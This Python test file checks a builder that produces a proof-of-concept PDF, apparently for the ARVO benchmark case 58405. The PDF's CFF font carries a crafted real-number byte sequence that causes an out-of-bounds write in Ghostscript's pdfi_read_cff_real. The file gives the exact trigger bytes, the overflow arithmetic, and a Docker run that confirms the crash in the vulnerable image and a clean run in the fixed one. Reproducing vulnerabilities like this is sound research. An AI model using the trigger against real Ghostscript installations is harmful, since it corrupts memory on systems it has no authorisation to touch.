r"""S21（arvo:58405 / GhostPDF CFF real 越界写）构造器测试。

验收点：
1. PDF 结构完整（%PDF 头 + 8 个对象 + xref），FontFile3 里是 CFF；
2. CFF 的 Top DICT 是 0x1e 开头的 real，字节序列符合"19x0xC1 + 2x0x11 + 0xCC"的算数；
3. 关键不变量：nibble 0xC 写 2 字符，0xCC 写 4 字符；必须让 txt 先到 61 再遇 0xCC；
4. 字段校验；
5. 端到端（有 docker + arvo:58405 镜像）：vul 在 pdfi_read_cff_real 崩、fix 干净。
"""
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from agent.builders import cff_pdf as cp


def test_pdf_structure():
    data = cp.proof_of_concept()
    assert data.startswith(b"%PDF-1.4")
    assert b"/FontFile3 8 0 R" in data
    assert b"/Subtype /CIDFontType0C" in data
    assert data.rstrip().endswith(b"%%EOF")
    # 8 个对象 + xref
    assert data.count(b" 0 obj") == 8
    assert b"xref" in data


def test_cff_real_bytes_arithmetic():
    font = cp.build_cff()
    # header(4) + name index + top dict index
    assert font[:4] == bytes([1, 0, 4, 4])
    # Top DICT 内容：0x1e + 19*0xC1 + 2*0x11 + 0xCC
    real = b"\x1e" + b"\xc1" * 19 + b"\x11" * 2 + b"\xcc"
    assert real in font
    # 验算：19*3 + 2*2 = 61 字符，再 0xCC 写 4 -> 65 -> 收尾 NUL 越界
    written = 19 * 3 + 2 * 2 + 4
    assert written == 65


def test_build_rejects_useless_params():
    assert cp.build({"n_c1": 0, "cc": 0}).ok is False
    assert cp.build({"n_c1": -1}).ok is False
    r = cp.build({"unknown": 1})
    assert r.ok and r.dropped and r.dropped[0]["field"] == "unknown"


def test_build_is_deterministic():
    assert cp.build({}).data == cp.build({}).data


def _docker_ready():
    import shutil
    import subprocess
    if not shutil.which("docker"):
        return False
    for img in ("n132/arvo:58405-vul", "n132/arvo:58405-fix"):
        if subprocess.run(["docker", "image", "inspect", img],
                          capture_output=True).returncode != 0:
            return False
    return True


@pytest.mark.skipif(not _docker_ready(), reason="需要 docker 与 arvo:58405 镜像")
def test_e2e_vuln_overflows_cff_real_and_fix_is_clean(tmp_path):
    import subprocess
    poc = tmp_path / "poc.pdf"
    poc.write_bytes(cp.proof_of_concept())

    def run(img):
        p = subprocess.run(["docker", "run", "--rm", "-v", "%s:/tmp/poc:ro" % poc, img, "/bin/arvo"],
                           capture_output=True, text=True, timeout=300)
        return p.returncode, p.stdout + p.stderr

    rc, txt = run("n132/arvo:58405-vul")
    assert "AddressSanitizer" in txt, txt[-300:]
    assert "pdfi_read_cff_real" in txt
    assert rc != 0

    rc2, txt2 = run("n132/arvo:58405-fix")
    assert "AddressSanitizer" not in txt2
    assert rc2 == 0
